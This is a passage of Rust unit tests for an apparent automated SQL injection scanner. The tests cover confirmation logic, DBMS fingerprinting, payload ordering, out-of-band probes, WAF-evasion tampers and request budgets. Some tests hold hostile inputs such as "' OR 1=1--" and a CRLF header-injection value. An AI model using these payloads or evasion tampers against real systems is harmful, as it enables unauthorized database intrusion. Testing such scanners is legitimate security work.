        assert!(needs_auto_second_pass(&medium));
        assert!(needs_auto_second_pass(&low));
        assert!(in_confirm_scope(&medium, ConfirmScope::MediumRisk));
        assert!(in_confirm_scope(&low, ConfirmScope::MediumRisk));
    }

    #[test]
    fn auto_second_pass_includes_former_window_mismatch_techniques() {
        // P2.4b: first-pass window parity fixed the former gaps — `Time`
        // re-sweeps the same payload family/budget (blind sweep included),
        // `Json` replays the GraphQL envelope, `Json`/`Nosql` re-probe the
        // finding's original channel (`channel=error` → error probe) and
        // `Nosql` keeps the JSON-body operator shape. A failed
        // re-confirmation is now conclusive, so these techniques join the
        // automatic scope instead of staying `--confirm`-only.
        let time = finding(TechniqueKind::Time, 0.6, "time delay control=ok")
            .with_false_positive_prob(0.40);
        let json =
            finding(TechniqueKind::Json, 0.75, "channel=error").with_false_positive_prob(0.10);
        let nosql =
            finding(TechniqueKind::Nosql, 0.75, "channel=error").with_false_positive_prob(0.10);
        for f in [&time, &json, &nosql] {
            assert!(needs_auto_second_pass(f), "{f:?}");
            assert!(in_confirm_scope(f, ConfirmScope::MediumRisk), "{f:?}");
            assert!(in_confirm_scope(f, ConfirmScope::All), "{f:?}");
        }
    }

    #[test]
    fn auto_second_pass_excludes_unconfirmed_and_oob() {
        let unconfirmed = finding(TechniqueKind::Error, 0.55, "error pattern unconfirmed");
        assert!(!needs_auto_second_pass(&unconfirmed));
        // OOB is never re-probed (collaborator proof is already authoritative).
        let oob = finding(TechniqueKind::Oob, 0.9, "oob seen=true").with_false_positive_prob(0.01);
        assert!(!needs_auto_second_pass(&oob));
        // Scope All keeps the historical OOB exclusion.
        assert!(!in_confirm_scope(&oob, ConfirmScope::All));
    }

    #[test]
    fn all_scope_takes_every_confirmed_non_oob() {
        // `--confirm` byte-identical: High/Medium/Low confirmed findings are
        // all re-validated; unconfirmed and OOB stay out.
        let high =
            finding(TechniqueKind::Union, 0.9, "union columns=3").with_false_positive_prob(0.02);
        let medium = finding(TechniqueKind::Boolean, 0.75, "boolean true_sim=0.8")
            .with_false_positive_prob(0.10);
        let low = finding(TechniqueKind::Stacked, 0.6, "stacked marker=ok")
            .with_false_positive_prob(0.40);
        let unconfirmed = finding(TechniqueKind::Error, 0.55, "error pattern unconfirmed");
        let oob = finding(TechniqueKind::Oob, 0.9, "oob seen=true");
        for f in [&high, &medium, &low] {
            assert!(in_confirm_scope(f, ConfirmScope::All), "{f:?}");
        }
        for f in [&unconfirmed, &oob] {
            assert!(!in_confirm_scope(f, ConfirmScope::All), "{f:?}");
        }
        // The automatic scope is the strict subset: High stays out.
        assert!(!in_confirm_scope(&high, ConfirmScope::MediumRisk));
        assert!(in_confirm_scope(&medium, ConfirmScope::MediumRisk));
        assert!(in_confirm_scope(&low, ConfirmScope::MediumRisk));
    }

    #[test]
    fn stacked_or_time_only_is_confirmed_but_not_oracle_eligible() {
        // Post-#17/#18 findings are confirmed (two-shot), but they cannot
        // feed a boolean-differential oracle: enumeration must stay silent.
        let stacked = finding(
            TechniqueKind::Stacked,
            0.6,
            "stacked dbms=generic marker=stacked_abc tamper=none confirmed=true",
        );
        let time = finding(
            TechniqueKind::Time,
            0.75,
            "time delay 3000ms > threshold 300ms tamper=none control=50ms",
        );
        assert!(has_confirmed_finding(&[stacked.clone(), time.clone()]));
        assert!(!is_extraction_eligible(&[stacked, time]));
    }

    #[test]
    fn boolean_stays_oracle_eligible() {
        let b = finding(
            TechniqueKind::Boolean,
            0.8,
            "boolean true_sim=0.9 false_sim=0.1",
        );
        assert!(has_confirmed_finding(std::slice::from_ref(&b)));
        assert!(is_extraction_eligible(std::slice::from_ref(&b)));
    }

    // v0.5-4 loop-closure: `>= 0.85` bar drives quote-correct payloads.

    #[test]
    fn dbms_label_needs_point_eight_five() {
        assert_eq!(dbms_payload_label(&DbmsBelief::uniform()), None);
        let mut confident = DbmsBelief::uniform();
        confident.update_with_signal(DbmsKind::MySql, 0.9);
        assert_eq!(dbms_payload_label(&confident), Some("mysql"));
        let mut weak = DbmsBelief::uniform();
        weak.update_with_signal(DbmsKind::Postgres, 0.6);
        // 0.6 signal still normalizes below the 0.85 fill bar.
        assert_eq!(dbms_payload_label(&weak), None);
    }

    #[test]
    fn finding_dbms_roundtrip() {
        assert_eq!(parse_finding_dbms(Some("mysql")), Some(DbmsKind::MySql));
        assert_eq!(
            parse_finding_dbms(Some("PostgreSQL")),
            Some(DbmsKind::Postgres)
        );
        assert_eq!(parse_finding_dbms(Some("mssql")), Some(DbmsKind::MsSql));
        assert_eq!(parse_finding_dbms(Some("oracle")), Some(DbmsKind::Oracle));
        assert_eq!(parse_finding_dbms(Some("sqlite")), Some(DbmsKind::Sqlite));
        assert_eq!(parse_finding_dbms(None), None);
        assert_eq!(parse_finding_dbms(Some("unknown-db")), None);
    }

    #[test]
    fn finding_label_keeps_sqlite_quote_style() {
        // P0-3: a confirmed sqlite finding must drive `--`-style confirm
        // payloads (was: `None` → generic `-- -` polyglots).
        use crate::session::state::{Finding, TechniqueKind};
        let mut f = Finding::new("http://a", "id@query", TechniqueKind::Error, 0.9, "e");
        f.dbms = Some("sqlite".to_owned());
        assert_eq!(dbms_label_from_finding(&f), Some("sqlite"));
        f.dbms = Some("  SQLITE ".to_owned());
        assert_eq!(dbms_label_from_finding(&f), Some("sqlite"));
        f.dbms = None;
        assert_eq!(dbms_label_from_finding(&f), None);
        f.dbms = Some("unknown-db".to_owned());
        assert_eq!(dbms_label_from_finding(&f), None);
    }

    #[test]
    fn json_scan_appends_graphql_after_direct() {
        // P0-2: `variables`-envelope probes ride last so L1 (`take(2)`)
        // stays byte-identical to the historical direct sweep.
        let v = crate::engine::schedule::json_scan_payloads(None);
        assert_eq!(v.len(), 8, "{v:?}");
        for (i, p) in v.iter().enumerate().take(6) {
            assert!(
                !p.true_payload.contains("variables"),
                "direct {i}: {}",
                p.true_payload
            );
        }
        assert!(
            v[6].true_payload.contains("\"variables\""),
            "{}",
            v[6].true_payload
        );
        assert!(
            v[7].true_payload.contains("\"variables\""),
            "{}",
            v[7].true_payload
        );
        // DBMS-narrowed belief keeps only its own envelope probe.
        let mysql = crate::engine::schedule::json_scan_payloads(Some("mysql"));
        assert_eq!(mysql.len(), 4, "{mysql:?}");
        assert!(mysql[3].true_payload.contains("\"variables\""));
        // sqlite has no envelope probe (narrow 2-payload JSON1 sweep).
        let sqlite = crate::engine::schedule::json_scan_payloads(Some("sqlite"));
        assert_eq!(sqlite.len(), 2, "{sqlite:?}");
        assert!(
            sqlite.iter().all(|p| !p.true_payload.contains("variables")),
            "{sqlite:?}"
        );
    }

    #[test]
    fn boolean_order_follows_quote_context() {
        use crate::techniques::boolean::payloads::boolean_payloads_for;
        let mut numeric_ctx = InjectionContext::new();
        numeric_ctx.quote = QuoteContext::None;
        numeric_ctx.numeric = true;
        let mut payloads = boolean_payloads_for(None);
        order_boolean_by_context(&mut payloads, &numeric_ctx);
        assert!(
            payloads
                .first()
                .is_some_and(|p| p.true_payload.starts_with('1')),
            "numeric bare must lead with `1 AND/OR`"
        );

        let mut dq_ctx = InjectionContext::new();
        dq_ctx.quote = QuoteContext::DoubleQuote;
        let mut payloads = boolean_payloads_for(None);
        order_boolean_by_context(&mut payloads, &dq_ctx);
        assert!(
            payloads
                .first()
                .is_some_and(|p| p.true_payload.starts_with('"')),
            "double-quote must lead with `\"`"
        );
    }

    #[test]
    fn order_by_prefix_is_quote_correct() {
        let mut ctx = InjectionContext::new();
        ctx.quote = QuoteContext::DoubleQuote;
        assert_eq!(order_by_prefix_for_context(&ctx), "\"");
        let mut numeric = InjectionContext::new();
        numeric.quote = QuoteContext::None;
        numeric.numeric = true;
        assert_eq!(order_by_prefix_for_context(&numeric), "");
        assert_eq!(order_by_prefix_for_context(&InjectionContext::new()), "'");
    }

    #[test]
    fn oob_payloads_narrow_with_confident_belief() {
        use crate::techniques::oob::payloads::oob_payloads_for;
        let mut belief = DbmsBelief::uniform();
        belief.update_with_signal(DbmsKind::MsSql, 0.9);
        let label = dbms_payload_label(&belief);
        assert_eq!(label, Some("mssql"));
        let narrowed = oob_payloads_for(label, "example.oob", "tok123");
        assert!(!narrowed.is_empty());
        assert!(narrowed.iter().all(|p| p.dbms == "mssql"));
        let generic = oob_payloads_for(None, "example.oob", "tok123");
        assert_eq!(generic.len(), 3);
    }

    #[test]
    fn confirmed_dbms_finding_promotes_hypothesis_belief() {
        let baseline = Baseline::new(&[
            Sample {
                status: 200,
                body: b"ok".to_vec(),
                duration: Duration::from_millis(50),
                headers: Vec::new(),
            },
            Sample {
                status: 200,
                body: b"ok".to_vec(),
                duration: Duration::from_millis(51),
                headers: Vec::new(),
            },
            Sample {
                status: 200,
                body: b"ok".to_vec(),
                duration: Duration::from_millis(52),
                headers: Vec::new(),
            },
        ]);
        let mut hyp = Hypothesis::new(
            "id@query".to_owned(),
            TechniqueKind::Union,
            DbmsBelief::uniform(),
            InjectionContext::new(),
        );
        let mut f = finding(
            TechniqueKind::Union,
            0.9,
            "union columns=3 order_by_inferred=3 tamper=none",
        );
        f.dbms = Some("postgres".to_owned());
        apply_outcome_to_hypothesis(&mut hyp, TechniqueKind::Union, &[f], 5, &baseline);
        let (top, prob) = hyp.dbms_belief.top_candidate();
        assert_eq!(top, DbmsKind::Postgres);
        assert!(prob >= 0.85, "post-promotion prob {prob} < 0.85");
        assert!(hyp.is_confirmed());
    }

    #[test]
    fn signal_calibration_matches_provisional_table() {
        // Provisional v0.5 table (recalibrate on `history.jsonl` once 5+ runs
        // per scenario exist): boolean/error 0.9, union 0.85, time/stacked
        // 0.8, json boolean-channel 0.9 else 0.75, oob 1.0.
        let confirmed = finding(TechniqueKind::Boolean, 0.9, "boolean ok");
        assert_eq!(
            infer_signal_and_trials(TechniqueKind::Boolean, &[confirmed], false),
            (0.9, 1)
        );
        let confirmed = finding(TechniqueKind::Union, 0.9, "union ok");
        assert_eq!(
            infer_signal_and_trials(TechniqueKind::Union, &[confirmed], false),
            (0.85, 1)
        );
        let confirmed = finding(TechniqueKind::Time, 0.8, "time ok");
        assert_eq!(
            infer_signal_and_trials(TechniqueKind::Time, &[confirmed], false),
            (0.8, 1)
        );
        let unconfirmed = finding(TechniqueKind::Error, 0.55, "error unconfirmed");
        assert_eq!(
            infer_signal_and_trials(TechniqueKind::Error, &[unconfirmed], true),
            (0.4, 0)
        );
    }

    #[test]
    fn budget_request_budget_defaults_to_none_and_helper() {
        // CODE calibration: default None = unlimited, byte-identical.
        // A1 evasion (~1032 req live) must never trip a default cap.
        let cfg = super::BudgetConfig::default();
        assert_eq!(cfg.request_budget, None);
        assert!(!super::BudgetConfig::is_over_request_budget(0, None));
        assert!(!super::BudgetConfig::is_over_request_budget(10_000, None));
        // Zero budget trips immediately (early-break path, cooperative stop).
        assert!(super::BudgetConfig::is_over_request_budget(0, Some(0)));
        assert!(super::BudgetConfig::is_over_request_budget(11, Some(0)));
        // Boundary: `>=` trips exactly at the cap, never before.
        assert!(!super::BudgetConfig::is_over_request_budget(24, Some(25)));
        assert!(super::BudgetConfig::is_over_request_budget(25, Some(25)));
        assert!(super::BudgetConfig::is_over_request_budget(666, Some(25)));
        assert!(!super::BudgetConfig::is_over_request_budget(
            1031,
            Some(1032)
        ));
        assert!(super::BudgetConfig::is_over_request_budget(
            1032,
            Some(1032)
        ));
    }

    #[test]
    fn budget_max_duration_defaults_to_none_and_helper() {
        // Phase 3: default None = unlimited, byte-identical.
        let cfg = super::BudgetConfig::default();
        assert_eq!(cfg.max_duration_secs, None);
        let now = std::time::Instant::now();
        assert!(!super::BudgetConfig::is_over_max_duration(now, None));
        // Zero budget trips immediately (early-break path).
        assert!(super::BudgetConfig::is_over_max_duration(now, Some(0)));
        // Future start + generous budget does not trip.
        assert!(!super::BudgetConfig::is_over_max_duration(now, Some(3600)));
        // Past start beyond budget trips.
        let past = now
            .checked_sub(std::time::Duration::from_secs(10))
            .unwrap_or(now);
        assert!(super::BudgetConfig::is_over_max_duration(past, Some(5)));
        assert!(!super::BudgetConfig::is_over_max_duration(past, Some(60)));
    }

    #[test]
    fn detection_deadline_none_is_unlimited_noop() {
        // `None` (default) = no deadline: mid-technique checks no-op,
        // detection byte-identical.
        let now = std::time::Instant::now();
        assert_eq!(super::BudgetConfig::detection_deadline(now, None), None);
        assert!(!super::BudgetConfig::is_past_deadline(None));
    }

    #[test]
    fn detection_deadline_trips_after_budget() {
        use super::BudgetConfig;
        let now = std::time::Instant::now();
        // Zero budget: deadline is (about) now, already past.
        let zero = BudgetConfig::detection_deadline(now, Some(0)).expect("deadline");
        assert!(BudgetConfig::is_past_deadline(Some(zero)));
        // Generous budget: future deadline, not past.
        let far = BudgetConfig::detection_deadline(now, Some(3600)).expect("deadline");
        assert!(!BudgetConfig::is_past_deadline(Some(far)));
        // Past start beyond budget: deadline already behind us.
        let past = now
            .checked_sub(std::time::Duration::from_secs(10))
            .unwrap_or(now);
        let blown = BudgetConfig::detection_deadline(past, Some(5)).expect("deadline");
        assert!(BudgetConfig::is_past_deadline(Some(blown)));
    }

    #[test]
    fn detection_deadline_clamps_huge_values_without_silent_unlimited() {
        // PR20: `u64::MAX` used to make `checked_add` return `None`,
        // conflated with "unlimited". Now clamped to the 24h cap: always a
        // real (future) deadline, never a silent fail-open.
        use super::{BudgetConfig, MAX_DETECTION_DURATION_SECS_CAP};
        assert_eq!(MAX_DETECTION_DURATION_SECS_CAP, 86_400);
        let now = std::time::Instant::now();
        let clamped =
            BudgetConfig::detection_deadline(now, Some(u64::MAX)).expect("clamped deadline");
        assert!(!BudgetConfig::is_past_deadline(Some(clamped)));
        // The clamp equals the capped input (idempotent).
        let at_cap = BudgetConfig::detection_deadline(now, Some(86_400)).expect("cap deadline");
        assert!(!BudgetConfig::is_past_deadline(Some(at_cap)));
        // `is_over_max_duration` never panics on huge values and never trips
        // immediately (Duration compare, no overflow).
        assert!(!BudgetConfig::is_over_max_duration(now, Some(u64::MAX)));
        assert!(BudgetConfig::is_over_max_duration(now, Some(0)));
    }

    #[test]
    fn baseline_all_error_only_on_full_5xx() {
        // Live case: `[520, 520, 520]` (CF origin-unreachable) must warn.
        assert!(super::baseline_all_error(&[520, 520, 520]));
        assert!(super::baseline_all_error(&[500]));
        assert!(super::baseline_all_error(&[500, 503, 524]));
        // Healthy or mixed baselines must not warn.
        assert!(!super::baseline_all_error(&[200, 200, 200]));
        assert!(!super::baseline_all_error(&[200, 520, 520]));
        assert!(!super::baseline_all_error(&[403, 403, 403]));
        assert!(!super::baseline_all_error(&[]));
    }

    #[test]
    fn scheduler_ttfb_static_by_default_and_dynamic_when_slow() {
        use super::build_scheduler_for_param;
        use crate::detection::scanner::scheduler::{cost_for, cost_for_with_ttfb};
        let cfg = super::EngineConfig::default();
        let hyps: Vec<Hypothesis> = vec![
            Hypothesis::new(
                "id@query".to_owned(),
                TechniqueKind::Boolean,
                DbmsBelief::uniform(),
                InjectionContext::new(),
            ),
            Hypothesis::new(
                "id@query".to_owned(),
                TechniqueKind::Time,
                DbmsBelief::uniform(),
                InjectionContext::new(),
            ),
        ];
        // mean 0 => static costs (L1 byte-identical).
        let sched = build_scheduler_for_param(&cfg, "id@query", &hyps, 0, 0.0);
        assert_eq!(sched.len(), 2);
        let base_time = cost_for(TechniqueKind::Time);
        assert!((cost_for_with_ttfb(base_time, 0.0) - base_time).abs() < 1e-12);
        // mean 5s => time cost doubles (3.0 -> 6.0), boolean stays 1.0.
        let scaled = cost_for_with_ttfb(base_time, 5000.0);
        assert!((scaled - 6.0).abs() < 1e-12);
        let sched_slow = build_scheduler_for_param(&cfg, "id@query", &hyps, 0, 5000.0);
        assert_eq!(sched_slow.len(), 2);
    }

    #[tokio::test]
    async fn baseline_concurrent_returns_three_samples() {
        use crate::{
            engine::orchestrator::{Engine, EngineConfig},
            http::{client::HttpClient, jitter::Jitter, rate_limit::RateLimiter},
            target::url::TargetUrl,
        };
        use std::{sync::Arc, time::Duration};
        use tokio_util::sync::CancellationToken;
        use wiremock::{Mock, MockServer, ResponseTemplate, matchers::method};

        let server = MockServer::start().await;
        Mock::given(method("GET"))
            .respond_with(ResponseTemplate::new(200).set_body_string("baseline-ok"))
            .mount(&server)
            .await;

        let client = HttpClient::builder()
            .timeout(Duration::from_secs(5))
            .jitter(Jitter::new(1.0, 0.5).with_min(0))
            .rate_limiter(Arc::new(RateLimiter::disabled()))
            .allow_private(true)
            .build()
            .expect("client build");
        let cfg = EngineConfig::test_defaults();
        let cancel = CancellationToken::new();
        let engine = Engine::new(cfg, client, cancel);
        let target =
            TargetUrl::parse(&format!("{}/?id=1", server.uri()), true).expect("target parse");
        let collected = engine
            .collect_baseline_uncached(&target, None)
            .await
            .expect("baseline ok")
            .expect("some baseline");
        let (baseline, _, _) = collected;
        assert_eq!(
            baseline.status_codes.len(),
            3,
            "concurrent baseline must return 3 samples"
        );
        assert!(baseline.status_codes.iter().all(|c| *c == 200));
    }

    #[test]
    fn waf_auto_tampers_are_space2comment_plus_randomcase() {
        use crate::techniques::tamper::Tamper;
        assert_eq!(
            super::waf_auto_tampers(),
            vec![Tamper::Space2Comment, Tamper::RandomCase]
        );
        // Blocking + no user tampers => auto-pair (never HPP/chunked here).
        assert_eq!(
            super::resolve_effective_tampers(true, &[]),
            vec![Tamper::Space2Comment, Tamper::RandomCase]
        );
        // Explicit user tampers always win, even when blocking.
        let user = vec![Tamper::VersionedComment];
        assert_eq!(super::resolve_effective_tampers(true, &user), user);
        // No block => user set unchanged (including empty).
        assert!(super::resolve_effective_tampers(false, &[]).is_empty());
    }

    #[test]
    fn app_filter_block_needs_double_400() {
        assert!(super::is_app_filter_block(400, 400));
        assert!(!super::is_app_filter_block(400, 200));
        assert!(!super::is_app_filter_block(200, 400));
        assert!(!super::is_app_filter_block(200, 200));
        // WAF statuses never count as app filter (separate gate).
        assert!(!super::is_app_filter_block(403, 403));
        assert!(!super::is_app_filter_block(406, 406));
        assert_eq!(super::APP_FILTER_STATUS, 400);
        assert_eq!(super::FILTER_STREAK_LIMIT, 3);
    }

    #[test]
    fn injection_spec_rejects_unrepresentable_header_cookie_values() {
        use super::{ProbeOpts, build_injection_spec_with_raw};
        use crate::{
            target::{
                markers::MarkerSet,
                parameters::{ParameterLocation, TargetParameter},
                url::TargetUrl,
            },
            techniques::payload_opts::PayloadOpts,
        };
        let target = TargetUrl::parse("http://example.com/?id=1", true).unwrap();
        let markers = MarkerSet::default();
        let popts = PayloadOpts::default();
        let opts = ProbeOpts::new(false, false);
        // Header injection with a newline-bearing payload (e.g. a
        // `space2newline` tamper) cannot travel in an HTTP header value:
        // the probe must be skipped (`None`), never sent un-injected and
        // scored as a negative trial (silent false negative).
        let header = TargetParameter::new(
            "X-Forwarded-For",
            ParameterLocation::Header("X-Forwarded-For".to_owned()),
            "1.2.3.4",
        );
        assert!(
            build_injection_spec_with_raw(
                &target,
                target.as_str(),
                &header,
                "' OR 1=1--",
                &markers,
                None,
                opts,
                &popts,
            )
            .is_some()
        );
        assert!(
            build_injection_spec_with_raw(
                &target,
                target.as_str(),
                &header,
                "' OR\n1=1--",
                &markers,
                None,
                opts,
                &popts,
            )
            .is_none()
        );
        // Same fail-closed rule for cookie injection.
        let cookie = TargetParameter::new("sess", ParameterLocation::Cookie, "abc");
        assert!(
            build_injection_spec_with_raw(
                &target,
                target.as_str(),
                &cookie,
                "' OR 1=1--",
                &markers,
                None,
                opts,
                &popts,
            )
            .is_some()
        );
        assert!(
            build_injection_spec_with_raw(
                &target,
                target.as_str(),
                &cookie,
                "x\r\nInjected: 1",
                &markers,
                None,
                opts,
                &popts,
            )
            .is_none()
        );
        // Query/body locations are unaffected (percent-encoded into URL/body,
        // always representable).
        let query = TargetParameter::new("id", ParameterLocation::Query, "1");
        assert!(
            build_injection_spec_with_raw(
                &target,
                target.as_str(),
                &query,
                "' OR\n1=1--",
                &markers,
                None,
                opts,
                &popts,
            )
            .is_some()
        );
    }
}
